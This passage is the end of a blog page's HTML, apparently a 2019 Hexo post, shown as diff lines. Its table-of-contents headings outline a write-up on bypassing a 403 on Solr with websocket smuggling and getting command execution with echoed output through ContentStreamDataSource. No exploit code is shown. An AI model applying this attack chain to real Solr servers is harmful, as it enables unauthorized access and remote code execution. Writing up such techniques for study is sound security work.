nav-level-6"><a class="nav-link" href="#2-交互提示后台使用solr提供搜索服务，联系websocket猜测可能是websocket-smuggle"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">2. 交互提示后台使用solr提供搜索服务，联系websocket猜测可能是websocket-smuggle</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-访问-solr提示403，于是⽤用websocket-smuggle访问发现可正常访问。"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">3. 访问/solr提示403，于是⽤用websocket-smuggle访问发现可正常访问。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-尝试命令执行行，无法外带，只能构造回显，参考-https-paper-seebug-org-1009-，可以尝试利利用-ContentStreamDataSource-构造回显，seebug的paper中没有给出poc因此需要参考solr文档构造回显"><span class="nav-number">1.0.4.4.</span> <span class="nav-text">4. 尝试命令执行行，无法外带，只能构造回显，参考 https://paper.seebug.org/1009/ ，可以尝试利利用 ContentStreamDataSource 构造回显，seebug的paper中没有给出poc因此需要参考solr文档构造回显</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp："><span class="nav-number">1.0.4.5.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料"><span class="nav-number">1.0.5.</span> <span class="nav-text">参考资料</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-0ang3el-websocket-smuggle"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">https://github.com/0ang3el/websocket-smuggle</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">70.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
